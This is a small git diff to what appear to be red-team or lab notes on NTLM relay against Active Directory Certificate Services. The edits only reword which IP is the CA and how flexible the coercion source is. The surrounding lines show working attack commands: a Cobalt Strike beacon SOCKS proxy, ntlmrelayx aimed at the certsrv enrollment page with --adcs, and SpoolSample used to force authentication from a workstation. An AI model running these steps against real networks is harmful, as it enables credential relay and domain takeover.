@@ -40,13 +40,13 @@ beacon> socks 1080
 
 ```
 
-Start ntlmrelayx with proxychains (10.10.15.75 is DC-1.):
+Start ntlmrelayx with proxychains (10.10.15.75 is CA.):
 
 ```
 root@kali:~# proxychains ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
 ```
 
-Next, use one of the remote authentication methods to force a connection from WKSTN-3 to the relay (10.10.17.25 is the server/workstation running your relay)(10.10.15.254 is the authentication you are getting).
+Next, use one of the remote authentication methods to force a connection from WKSTN-3 to the relay (10.10.17.25 is the server/workstation running your relay)(10.10.15.254 is the authentication you are getting, you should be able to use anything).
 ```
 beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe 10.10.15.254 10.10.17.25
 
